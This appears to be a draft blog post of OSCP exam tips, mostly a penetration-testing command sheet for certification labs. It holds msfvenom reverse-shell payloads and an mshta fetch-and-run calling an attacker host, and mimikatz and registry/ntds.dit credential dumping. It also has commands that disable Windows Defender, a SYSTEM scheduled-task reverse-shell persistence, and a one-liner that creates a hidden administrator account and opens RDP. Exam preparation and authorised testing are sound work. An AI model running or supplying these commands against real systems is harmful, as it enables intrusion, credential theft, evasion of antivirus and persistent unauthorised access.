+++
title = "OSCP tips, commands, and random things"
tags = ["OSCP", "exam", "TJNull", "Lain"]
date = "2025-05-25"
draft: true
+++

# Methodology

You'll see people mention it time and time again. As you draw closer to the exam, you need to focus on developing your methodology if you haven't. Having a methodical approach to each box, can help ensure that you don't miss things. A process of checking for all the basic things, the same way, on every new box. Your methodology can get very in the weeds, or can be more high-level. Just try to ensure that you're doing all your checks, at every step, *every* time.


## My Methodology

1. Start scan of all tcp ports
2. Scan "useful" udp ports, such as 161
3. If web ports were found in the tcp scan, start fuzzing the ports
    - While fuzzing, use firefox and browse to the web ports.
      - Looking for
      - default creds `admin / admin`
      - SQLi possibility
      - Information Disclosure
4. If SNMP is open
    - `snmpwalk` with "public" as a community string


## Example of my Commands File


```bash
!! RUN WINPEAS EVEN AS SYSTEM !!

!! TEST ALL PORTS BEFORE DIVING ANY !!

!! ALWAYS SCAN UDP !!

!! READ ALL  WORDS ON ERROR !!

!! PAY ATTENTION TO HASHCAT EXAMPLE HASHES !!

!! ENUMERATE PUTTY REGISTRY IF INSTALLED !!

!! DON'T TRUST BURP URLENCODE !!

!! GOOGLE ALL SOFTWARE + EXPLOIT !!

!! TRY UPPER / LOWER OF CREDS !!

!! IF LINPEAS == HIGHLY PROPABLE... TRY IT !!

:%s/$cb_ip/<my_ip>/g

{{{ =-=-= Scanning =-=-=

sudo $(which autorecon)

sudo nmap -sC -sV -vv -p- $target -oN all_tcp_scan-$target
sudo nmap -sU -vv -p 25,161,53 $target


{{{ =-= Web =-=
!! look around, hover over links for hostnames, add to /etc/hosts !!
ffuf -w /home/kali/tools/web/default-weblist -u http://$target/FUZZ
// vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$target" -u http://$target -ac

## if there's a .git
mkdir $git_dir
git-dumper $target $git_dir
## use gitkraken to view repo super nicely


}}}


{{{ =-= ftp =-=

ftp anonymous@$target
// any pass is fine  it allows anonymous
// if getting weird error/no output
passive

// recursively get everything
wget -r ftp://$user:@$target

}}}


{{{ =-= smb =-=

smbclient -N -L //$target
nxc smb $target -u "Guest" -p '' --shares
nxc smb $target -u '$user' -p '$pass' --users
nxc smb $target -u '$user' -p '$pass' --groups
impacket-smbclient [$domain]/$user:$password@$target


}}}


{{{ =-= kerberos =-=

kerbrute --dc $dc -d $domain userenum /usr/share/seclists/Usernames/Names/names.txt -o users.txt
impacket-GetNPUsers -usersfile users.txt $domain/

}}}



{{{ =-= snmp =-=

snmpwalk -v2c -c public $target

snmpwalk -v 2c -c public $target NET-SNMP-EXTEND-MIB::nsExtendOutputFull

}}}


}}}



{{{ =-=-= Transfer / Redir =-=-=


{{{ =-= ligolo-ng =-=

cd /opt/ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:443

## get agent to target
agent.exe -ignore-cert -connect $cb_ip:443


}}}

## web server with upload form/POST request friendly
python3 -m uploadserver 80
tools-upload.py

## jank windows
net user guest /active:yes
net share $share=$dir_to_share /GRANT:Everyone,FULL
Icacls $dir_to_share /grant Everyone:F /inheritance:e /T



}}}



{{{ =-=-= Linux =-=-=


{{{ =-= freetty =-=

python3 -c 'import pty;pty.spawn("/bin/bash")'            
// CTRL+Z
stty raw -echo;fg
export TERM=xterm

}}}

!! run even w/o pw !!
sudo -l


!! MAKE NOTE OF ANYTHING ABNORMAL !!
ls -latrF .
ls -latrF /tmp /opt / /home
netstat -pantu
ps axjf

{{{ =-= ssh =-=
## see if current user can ssh
cat /etc/ssh/sshd_config
## if yes, add
mkdir /home/$(whoami)/.ssh; echo "$my_public_key" >> /home/$(whoami)/.ssh/authorized_keys
ssh $user@$target
}}}

## get linpeas
wget http://$cb_ip/linpeas.sh
curl http://$cb_ip/linpeas.sh -O linpeas.sh

!! READ ALL OUTPUT !!

## try any creds against all users
su $user


}}}




{{{ =-=-= Windows =-=-=


{{{ =-= privs =-= 

SeImpersonate -> Potato  ## free system
Backup:  ## can save registry 


reg save hklm\sam C:\windows\temp\SAM
reg save hklm\system C:\windows\temp\SYSTEM
reg save hklm\security C:\windows\temp\SECURITY


## if on a domain, need ntds.dit
{{{ dsh file
set context persistent nowriters
add volume c: alias test
create
expose %test% z:
}}}

unix2dos $dsh_file

// on windows target
diskshadow /s $dsh_file
robocopy /b Z:\windows\ntds . ntds.dit

}}}


{{{ =-= awareness =-=

whoami
whoami /priv
dir c:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
!! look for non-standard bins !!
## if putty
reg query HKCU\Software\SimonTatham\PuTTY /s

dir "C:\Users"
dir "C:\Users\$user"

## mimikatz
privilege::debug
sekurlsa::logonpasswords
## one liner, no winrm
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"


powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -Classname win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '$service_name'}

}}}



{{{ =-= common =-=


msfvenom -p windows/x64/shell_reverse_tcp LHOST=$cb_ip LPORT=$cb_port -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$cb_ip LPORT=$cb_port -f hta-psh -o shell.hta

## rlwrap for nicer shell
rlwrap nc -lvnp $cb_port
## reverse shell with hta
mshta http://$cb_ip/shell.hta


## sweet potato execution
cmd /c "SweetPotato.exe -p 'reverse.exe'"
cmd /c "spoofer.exe -c reverse.exe"

Rubeus.exe kerberoast /outfile:hashes.kerb

SharpHound.exe -c all --outputdirectory C:\windows\temp --outputprefix "OSCP"
## start bloodhound
sudo neo4j start
http://localhost:7474
neo4j	/	neo4j
bloodhound
## upload data, select zip from target

// Disable AV
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'

powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "c:\temp\yourstuffs.exe"'

}}}



{{{ =-= Persistence / RDP =-=


schtasks /ru SYSTEM /create /sc MINUTE /mo 5  /tn 'revshell' /tr '$rev_shell' 



net user /add penuser HackedPass1! && net localgroup administrators penuser /add & net localgroup "Remote Desktop Users" penuser /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v penuser /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

## make sure it worked
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
netstat -ano


net user administrator HackedPass1!

}}}


{{{ =-= hashes =-=

// if local

impacket-secretsdump -system $system -sam $sam LOCAL

// use to pass the hash
impacket-psexec 

}}}


}}}




{{{ =-=-= Flags =-=-=

!! MUST TAKE A SCREENSHOT !!
!! MUST BE IN A SHELL !!

=-= Lin =-=

ip a sh; echo "root proof"; cat /root/proof.txt; echo; echo "local proof"; cat /home/*/local.txt

=-= Win =-=

ipconfig; echo "adminsitrator flag"; cat C:\users\administrator\desktop\proof.txt; echo "user flag"; cat C:\users\*\desktop\local.txt -erroraction SilentlyContinue

!! MUST TAKE A SCREENSHOT !!
!! MUST BE IN A SHELL !!


}}}
```